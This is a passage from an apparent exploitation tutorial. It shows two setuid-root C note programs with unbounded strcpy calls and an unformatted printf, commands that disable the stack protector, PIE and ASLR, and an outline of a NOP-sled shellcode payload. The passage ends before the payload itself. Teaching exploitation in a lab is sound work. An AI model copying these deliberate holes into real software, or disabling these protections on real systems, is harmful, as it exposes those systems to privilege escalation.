<span class="line"><span style="color:#FF79C6">int</span><span style="color:#50FA7B"> main</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">int</span><span style="color:#FFB86C;font-style:italic"> argc</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#FFB86C;font-style:italic">argv</span><span style="color:#FF79C6">[]</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2">{</span></span>
<span class="line"><span style="color:#FF79C6">  int</span><span style="color:#F8F8F2"> userid, fd;</span><span style="color:#6272A4"> // File descriptor</span></span>
<span class="line"><span style="color:#FF79C6">  char</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">buffer, </span><span style="color:#FF79C6">*</span><span style="color:#F8F8F2">datafile;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F8F8F2">  buffer </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">)</span><span style="color:#50FA7B">ec_malloc</span><span style="color:#F8F8F2">(</span><span style="color:#BD93F9">100</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#F8F8F2">  datafile </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">)</span><span style="color:#50FA7B">ec_malloc</span><span style="color:#F8F8F2">(</span><span style="color:#BD93F9">20</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#50FA7B">  strcpy</span><span style="color:#F8F8F2">(datafile, </span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">/var/notes</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">  if</span><span style="color:#F8F8F2"> (argc </span><span style="color:#FF79C6">&#x3C;</span><span style="color:#BD93F9"> 2</span><span style="color:#F8F8F2">)</span><span style="color:#6272A4">                 // If there aren't command-line arguments,</span></span>
<span class="line"><span style="color:#50FA7B">    usage</span><span style="color:#F8F8F2">(argv[</span><span style="color:#BD93F9">0</span><span style="color:#F8F8F2">], datafile);</span><span style="color:#6272A4"> // display usage message and exit.</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">  strcpy</span><span style="color:#F8F8F2">(buffer, argv[</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">]);</span><span style="color:#6272A4"> // Copy into buffer.</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">  printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">[DEBUG] buffer @ </span><span style="color:#BD93F9">%p</span><span style="color:#F1FA8C">: </span><span style="color:#FF79C6">\'</span><span style="color:#BD93F9">%s</span><span style="color:#FF79C6">\'\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, buffer, buffer);</span></span>
<span class="line"><span style="color:#50FA7B">  printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">[DEBUG] datafile @ </span><span style="color:#BD93F9">%p</span><span style="color:#F1FA8C">: </span><span style="color:#FF79C6">\'</span><span style="color:#BD93F9">%s</span><span style="color:#FF79C6">\'\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, datafile, datafile);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4">  // Opening the file</span></span>
<span class="line"><span style="color:#F8F8F2">  fd </span><span style="color:#FF79C6">=</span><span style="color:#50FA7B"> open</span><span style="color:#F8F8F2">(datafile, O_WRONLY </span><span style="color:#FF79C6">|</span><span style="color:#F8F8F2"> O_CREAT </span><span style="color:#FF79C6">|</span><span style="color:#F8F8F2"> O_APPEND, S_IRUSR </span><span style="color:#FF79C6">|</span><span style="color:#F8F8F2"> S_IWUSR);</span></span>
<span class="line"><span style="color:#FF79C6">  if</span><span style="color:#F8F8F2"> (fd </span><span style="color:#FF79C6">==</span><span style="color:#FF79C6"> -</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#50FA7B">    fatal</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">in main() while opening file</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#50FA7B">  printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">[DEBUG] file descriptor is </span><span style="color:#BD93F9">%d</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, fd);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F8F8F2">  userid </span><span style="color:#FF79C6">=</span><span style="color:#50FA7B"> getuid</span><span style="color:#F8F8F2">();</span><span style="color:#6272A4"> // Get the real user ID.</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4">  // Writing data</span></span>
<span class="line"><span style="color:#FF79C6">  if</span><span style="color:#F8F8F2"> (</span><span style="color:#50FA7B">write</span><span style="color:#F8F8F2">(fd, </span><span style="color:#FF79C6">&#x26;</span><span style="color:#F8F8F2">userid, </span><span style="color:#BD93F9">4</span><span style="color:#F8F8F2">) </span><span style="color:#FF79C6">==</span><span style="color:#FF79C6"> -</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">)</span><span style="color:#6272A4"> // Write user ID before note data.</span></span>
<span class="line"><span style="color:#50FA7B">    fatal</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">in main() while writing userid to file</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#50FA7B">  write</span><span style="color:#F8F8F2">(fd, </span><span style="color:#E9F284">"</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">);</span><span style="color:#6272A4">                          // Terminate line.</span></span>
<span class="line"><span style="color:#FF79C6">  if</span><span style="color:#F8F8F2"> (</span><span style="color:#50FA7B">write</span><span style="color:#F8F8F2">(fd, buffer, </span><span style="color:#50FA7B">strlen</span><span style="color:#F8F8F2">(buffer)) </span><span style="color:#FF79C6">==</span><span style="color:#FF79C6"> -</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">)</span><span style="color:#6272A4"> // Write note.</span></span>
<span class="line"><span style="color:#50FA7B">    fatal</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">in main() while writing buffer to file</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">  write</span><span style="color:#F8F8F2">(fd, </span><span style="color:#E9F284">"</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">);</span><span style="color:#6272A4"> // Terminate line.</span></span>
<span class="line"><span style="color:#6272A4">  // Closing file</span></span>
<span class="line"><span style="color:#FF79C6">  if</span><span style="color:#F8F8F2"> (</span><span style="color:#50FA7B">close</span><span style="color:#F8F8F2">(fd) </span><span style="color:#FF79C6">==</span><span style="color:#FF79C6"> -</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#50FA7B">    fatal</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">in main() while closing file</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#50FA7B">  printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">Note has been saved.</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#50FA7B">  free</span><span style="color:#F8F8F2">(buffer);</span></span>
<span class="line"><span style="color:#50FA7B">  free</span><span style="color:#F8F8F2">(datafile);</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span>
<span class="line"></span></code></pre>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> notetaker.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> notetaker</span><span style="color:#BD93F9"> -g</span></span>
<span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> chown</span><span style="color:#F1FA8C"> root:root</span><span style="color:#F1FA8C"> notetaker</span></span>
<span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> chmod</span><span style="color:#F1FA8C"> u+s</span><span style="color:#F1FA8C"> notetaker</span></span>
<span class="line"><span style="color:#50FA7B">./notetaker</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">example message</span><span style="color:#E9F284">"</span></span>
<span class="line"></span></code></pre>
<p>The second program, the vulnerable one, is used to search notes for the
current user. Optionally, we can show only the messages that contain a
specific string.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">stdio.h</span><span style="color:#E9F284">></span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">string.h</span><span style="color:#E9F284">></span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">fcntl.h</span><span style="color:#E9F284">></span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">unistd.h</span><span style="color:#E9F284">></span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">sys/stat.h</span><span style="color:#E9F284">></span></span>
<span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">hacking.h</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">#define</span><span style="color:#50FA7B"> FILENAME</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">/var/notes</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">int</span><span style="color:#50FA7B"> print_notes</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">int</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">int</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">);</span><span style="color:#6272A4"> // Note printing function.</span></span>
<span class="line"><span style="color:#FF79C6">int</span><span style="color:#50FA7B"> find_user_note</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">int</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">int</span><span style="color:#F8F8F2">);</span><span style="color:#6272A4">      // Seek in file for a note for user.</span></span>
<span class="line"><span style="color:#FF79C6">int</span><span style="color:#50FA7B"> search_note</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">);</span><span style="color:#6272A4">   // Search for keyword function.</span></span>
<span class="line"><span style="color:#FF79C6">void</span><span style="color:#50FA7B"> fatal</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">);</span><span style="color:#6272A4">                // Fatal error handler</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">int</span><span style="color:#50FA7B"> main</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">int</span><span style="color:#FFB86C;font-style:italic"> argc</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#FFB86C;font-style:italic">argv</span><span style="color:#FF79C6">[]</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2">{</span></span>
<span class="line"><span style="color:#FF79C6">  int</span><span style="color:#F8F8F2"> userid, printing </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 1</span><span style="color:#F8F8F2">, fd;</span><span style="color:#6272A4"> // File descriptor</span></span>
<span class="line"><span style="color:#FF79C6">  char</span><span style="color:#F8F8F2"> searchstring[</span><span style="color:#BD93F9">100</span><span style="color:#F8F8F2">];</span></span>
<span class="line"><span style="color:#FF79C6">  if</span><span style="color:#F8F8F2"> (argc </span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> 1</span><span style="color:#F8F8F2">)</span><span style="color:#6272A4">                      // If there is an arg,</span></span>
<span class="line"><span style="color:#50FA7B">    strcpy</span><span style="color:#F8F8F2">(searchstring, argv[</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">]);</span><span style="color:#6272A4"> // that is the search string;</span></span>
<span class="line"><span style="color:#FF79C6">  else</span><span style="color:#6272A4">                               // otherwise,</span></span>
<span class="line"><span style="color:#F8F8F2">    searchstring[</span><span style="color:#BD93F9">0</span><span style="color:#F8F8F2">] </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">;</span><span style="color:#6272A4">           // search string is empty.</span></span>
<span class="line"><span style="color:#F8F8F2">  userid </span><span style="color:#FF79C6">=</span><span style="color:#50FA7B"> getuid</span><span style="color:#F8F8F2">();</span></span>
<span class="line"><span style="color:#F8F8F2">  fd </span><span style="color:#FF79C6">=</span><span style="color:#50FA7B"> open</span><span style="color:#F8F8F2">(FILENAME, O_RDONLY);</span><span style="color:#6272A4"> // Open the file for read-only access.</span></span>
<span class="line"><span style="color:#FF79C6">  if</span><span style="color:#F8F8F2"> (fd </span><span style="color:#FF79C6">==</span><span style="color:#FF79C6"> -</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#50FA7B">    fatal</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">in main() while opening file for reading</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#50FA7B">  printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#BD93F9">%i</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, printing);</span></span>
<span class="line"><span style="color:#FF79C6">  while</span><span style="color:#F8F8F2"> (printing)</span></span>
<span class="line"><span style="color:#F8F8F2">    printing </span><span style="color:#FF79C6">=</span><span style="color:#50FA7B"> print_notes</span><span style="color:#F8F8F2">(fd, userid, searchstring);</span></span>
<span class="line"><span style="color:#50FA7B">  printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">-------[ end of note data ]-------</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#50FA7B">  close</span><span style="color:#F8F8F2">(fd);</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4">// A function to print the notes for a given uid that match</span></span>
<span class="line"><span style="color:#6272A4">// an optional search string;</span></span>
<span class="line"><span style="color:#6272A4">// returns 0 at end of file, 1 if there are still more notes.</span></span>
<span class="line"><span style="color:#FF79C6">int</span><span style="color:#50FA7B"> print_notes</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">int</span><span style="color:#FFB86C;font-style:italic"> fd</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">int</span><span style="color:#FFB86C;font-style:italic"> uid</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#FFB86C;font-style:italic">searchstring</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2">{</span></span>
<span class="line"><span style="color:#FF79C6">  int</span><span style="color:#F8F8F2"> note_length;</span></span>
<span class="line"><span style="color:#FF79C6">  char</span><span style="color:#F8F8F2"> byte </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">, note_buffer[</span><span style="color:#BD93F9">100</span><span style="color:#F8F8F2">];</span></span>
<span class="line"><span style="color:#F8F8F2">  note_length </span><span style="color:#FF79C6">=</span><span style="color:#50FA7B"> find_user_note</span><span style="color:#F8F8F2">(fd, uid);</span></span>
<span class="line"><span style="color:#FF79C6">  if</span><span style="color:#F8F8F2"> (note_length </span><span style="color:#FF79C6">==</span><span style="color:#FF79C6"> -</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">)</span><span style="color:#6272A4">                      // If end of file reached,</span></span>
<span class="line"><span style="color:#FF79C6">    return</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">;</span><span style="color:#6272A4">                               // return 0.</span></span>
<span class="line"><span style="color:#50FA7B">  read</span><span style="color:#F8F8F2">(fd, note_buffer, note_length);</span><span style="color:#6272A4">         // Read note data.</span></span>
<span class="line"><span style="color:#F8F8F2">  note_buffer[note_length] </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">;</span><span style="color:#6272A4">               // Terminate the string.</span></span>
<span class="line"><span style="color:#FF79C6">  if</span><span style="color:#F8F8F2"> (</span><span style="color:#50FA7B">search_note</span><span style="color:#F8F8F2">(note_buffer, searchstring))</span><span style="color:#6272A4"> // If searchstring found,</span></span>
<span class="line"><span style="color:#50FA7B">    printf</span><span style="color:#F8F8F2">(note_buffer);</span><span style="color:#6272A4">                    // print the note.</span></span>
<span class="line"><span style="color:#FF79C6">  return</span><span style="color:#BD93F9"> 1</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4">// A function to find the next note for a given userID;</span></span>
<span class="line"><span style="color:#6272A4">// returns -1 if the end of the file is reached;</span></span>
<span class="line"><span style="color:#6272A4">// otherwise, it returns the length of the found note.</span></span>
<span class="line"><span style="color:#FF79C6">int</span><span style="color:#50FA7B"> find_user_note</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">int</span><span style="color:#FFB86C;font-style:italic"> fd</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">int</span><span style="color:#FFB86C;font-style:italic"> user_uid</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2">{</span></span>
<span class="line"><span style="color:#FF79C6">  int</span><span style="color:#F8F8F2"> note_uid </span><span style="color:#FF79C6">=</span><span style="color:#FF79C6"> -</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#FF79C6">  unsigned</span><span style="color:#FF79C6"> char</span><span style="color:#F8F8F2"> byte;</span></span>
<span class="line"><span style="color:#FF79C6">  int</span><span style="color:#F8F8F2"> length;</span></span>
<span class="line"><span style="color:#FF79C6">  while</span><span style="color:#F8F8F2"> (note_uid </span><span style="color:#FF79C6">!=</span><span style="color:#F8F8F2"> user_uid)</span></span>
<span class="line"><span style="color:#F8F8F2">    {</span><span style="color:#6272A4">                                                        // Loop until a note for user_uid is found.</span></span>
<span class="line"><span style="color:#FF79C6">      if</span><span style="color:#F8F8F2"> (</span><span style="color:#50FA7B">read</span><span style="color:#F8F8F2">(fd, </span><span style="color:#FF79C6">&#x26;</span><span style="color:#F8F8F2">note_uid, </span><span style="color:#BD93F9">4</span><span style="color:#F8F8F2">) </span><span style="color:#FF79C6">!=</span><span style="color:#BD93F9"> 4</span><span style="color:#F8F8F2">)</span><span style="color:#6272A4"> // Read the uid data.</span></span>
<span class="line"><span style="color:#FF79C6">        return</span><span style="color:#FF79C6"> -</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">;</span><span style="color:#6272A4">                                       // If 4 bytes aren't read, return end of file code.</span></span>
<span class="line"><span style="color:#FF79C6">      if</span><span style="color:#F8F8F2"> (</span><span style="color:#50FA7B">read</span><span style="color:#F8F8F2">(fd, </span><span style="color:#FF79C6">&#x26;</span><span style="color:#F8F8F2">byte, </span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">) </span><span style="color:#FF79C6">!=</span><span style="color:#BD93F9"> 1</span><span style="color:#F8F8F2">)</span><span style="color:#6272A4">                         // Read the newline separator.</span></span>
<span class="line"><span style="color:#FF79C6">        return</span><span style="color:#FF79C6"> -</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#F8F8F2">      byte </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> length </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#FF79C6">      while</span><span style="color:#F8F8F2"> (byte </span><span style="color:#FF79C6">!=</span><span style="color:#E9F284"> '</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2">        {</span><span style="color:#6272A4">                                // Figure out how many bytes to the end of line.</span></span>
<span class="line"><span style="color:#FF79C6">          if</span><span style="color:#F8F8F2"> (</span><span style="color:#50FA7B">read</span><span style="color:#F8F8F2">(fd, </span><span style="color:#FF79C6">&#x26;</span><span style="color:#F8F8F2">byte, </span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">) </span><span style="color:#FF79C6">!=</span><span style="color:#BD93F9"> 1</span><span style="color:#F8F8F2">)</span><span style="color:#6272A4"> // Read a single byte.</span></span>
<span class="line"><span style="color:#FF79C6">            return</span><span style="color:#FF79C6"> -</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">;</span><span style="color:#6272A4">               // If byte isn't read, return end of file code.</span></span>
<span class="line"><span style="color:#F8F8F2">          length</span><span style="color:#FF79C6">++</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#F8F8F2">        }</span></span>
<span class="line"><span style="color:#F8F8F2">    }</span></span>
<span class="line"><span style="color:#50FA7B">  lseek</span><span style="color:#F8F8F2">(fd, length </span><span style="color:#FF79C6">*</span><span style="color:#FF79C6"> -</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">, SEEK_CUR);</span><span style="color:#6272A4"> // Rewind file reading by length bytes.</span></span>
<span class="line"><span style="color:#50FA7B">  printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">[DEBUG] found a </span><span style="color:#BD93F9">%d</span><span style="color:#F1FA8C"> byte note for user id </span><span style="color:#BD93F9">%d</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, length, note_uid);</span></span>
<span class="line"><span style="color:#FF79C6">  return</span><span style="color:#F8F8F2"> length;</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4">// A function to search a note for a given keyword;</span></span>
<span class="line"><span style="color:#6272A4">// returns 1 if a match is found, 0 if there is no match.</span></span>
<span class="line"><span style="color:#FF79C6">int</span><span style="color:#50FA7B"> search_note</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#FFB86C;font-style:italic">note</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#FFB86C;font-style:italic">keyword</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2">{</span></span>
<span class="line"><span style="color:#FF79C6">  int</span><span style="color:#F8F8F2"> i, keyword_length, match </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#F8F8F2">  keyword_length </span><span style="color:#FF79C6">=</span><span style="color:#50FA7B"> strlen</span><span style="color:#F8F8F2">(keyword);</span></span>
<span class="line"><span style="color:#FF79C6">  if</span><span style="color:#F8F8F2"> (keyword_length </span><span style="color:#FF79C6">==</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">)</span><span style="color:#6272A4"> // If there is no search string,</span></span>
<span class="line"><span style="color:#FF79C6">    return</span><span style="color:#BD93F9"> 1</span><span style="color:#F8F8F2">;</span><span style="color:#6272A4">            // always "match".</span></span>
<span class="line"><span style="color:#FF79C6">  for</span><span style="color:#F8F8F2"> (i </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">; i </span><span style="color:#FF79C6">&#x3C;</span><span style="color:#50FA7B"> strlen</span><span style="color:#F8F8F2">(note); i</span><span style="color:#FF79C6">++</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2">    {</span><span style="color:#6272A4">                                  // Iterate over bytes in note.</span></span>
<span class="line"><span style="color:#FF79C6">      if</span><span style="color:#F8F8F2"> (note[i] </span><span style="color:#FF79C6">==</span><span style="color:#F8F8F2"> keyword[match])</span><span style="color:#6272A4"> // If byte matches keyword,</span></span>
<span class="line"><span style="color:#F8F8F2">        match</span><span style="color:#FF79C6">++</span><span style="color:#F8F8F2">;</span><span style="color:#6272A4">                   // get ready to check the next byte;</span></span>
<span class="line"><span style="color:#FF79C6">      else</span></span>
<span class="line"><span style="color:#F8F8F2">        {</span><span style="color:#6272A4">                              // otherwise,</span></span>
<span class="line"><span style="color:#FF79C6">          if</span><span style="color:#F8F8F2"> (note[i] </span><span style="color:#FF79C6">==</span><span style="color:#F8F8F2"> keyword[</span><span style="color:#BD93F9">0</span><span style="color:#F8F8F2">])</span><span style="color:#6272A4"> // if that byte matches first keyword byte,</span></span>
<span class="line"><span style="color:#F8F8F2">            match </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 1</span><span style="color:#F8F8F2">;</span><span style="color:#6272A4">             // start the match count at 1.</span></span>
<span class="line"><span style="color:#FF79C6">          else</span></span>
<span class="line"><span style="color:#F8F8F2">            match </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">;</span><span style="color:#6272A4"> // Otherwise it is zero.</span></span>
<span class="line"><span style="color:#F8F8F2">        }</span></span>
<span class="line"><span style="color:#FF79C6">      if</span><span style="color:#F8F8F2"> (match </span><span style="color:#FF79C6">==</span><span style="color:#F8F8F2"> keyword_length)</span><span style="color:#6272A4"> // If there is a full match,</span></span>
<span class="line"><span style="color:#FF79C6">        return</span><span style="color:#BD93F9"> 1</span><span style="color:#F8F8F2">;</span><span style="color:#6272A4">                // return matched.</span></span>
<span class="line"><span style="color:#F8F8F2">    }</span></span>
<span class="line"><span style="color:#FF79C6">  return</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">;</span><span style="color:#6272A4"> // Return not matched.</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span>
<span class="line"></span></code></pre>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> notesearch.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> notesearch</span><span style="color:#BD93F9"> -fno-stack-protector</span><span style="color:#BD93F9"> -no-pie</span><span style="color:#BD93F9"> -g</span></span>
<span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> chown</span><span style="color:#F1FA8C"> root:root</span><span style="color:#F1FA8C"> notesearch</span></span>
<span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> chmod</span><span style="color:#F1FA8C"> u+s</span><span style="color:#F1FA8C"> notesearch</span></span>
<span class="line"><span style="color:#50FA7B">./notesearch</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">example</span><span style="color:#E9F284">"</span></span>
<span class="line"></span></code></pre>
<p>We need to disable the Adress Space Layout Randomization (ASLR) to avoid
random memory addreses.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#BD93F9"> 0</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> sudo</span><span style="color:#F1FA8C"> tee</span><span style="color:#F1FA8C"> /proc/sys/kernel/randomize_va_space</span></span>
<span class="line"></span></code></pre>
<p>You may be wondering if ASLR and PIE do the same. Both disable the
randomization of memory addresses for executables. That’s true. However,
they randomize different things. ASLR is a kernel protection feature,
and it has three levels in Linux:</p>
<ol>
<li>Disable ASLR. This setting is applied if the kernel is booted with
the norandmaps boot parameter (in Linux).</li>
<li>Randomize the positions of the stack, virtual dynamic shared object
(VDSO) page, and shared memory regions. The base address of the data
segment is located immediately after the end of the executable code
segment.</li>
<li>Randomize the positions of the stack, VDSO page, shared memory
regions, and the data segment. This is the default setting.</li>
</ol>
<p>PIE is a binary protection feature that places the “code segment”, the
“global offset table” and their “procedure linkage table” at random
locations.</p>
<p>The last security protection we need to <a href="https://superuser.com/a/1385242">disable is the NX
bit</a>. That will make the stack
executable. In other words, we will be able to execute the shellcode.</p>
<p>Let’s take a step back. Where is the vulnerability? The notetaker <code>main</code>
function calls <code>strcpy</code>. Again, there’s no control over the length of
the copied data. The high-level idea is the same as in the last
exercise. We want to overwrite the return address to take control of the
flow. The way to find it is the same. However, the payload is structured
differently. We aren’t going to send a bunch of “a” followed by a memory
address in the executable. We want to build a payload that looks like:
“NOP sled, shellcode, some more NOP operations, NOP sled address”. Let
me explain each part.</p>
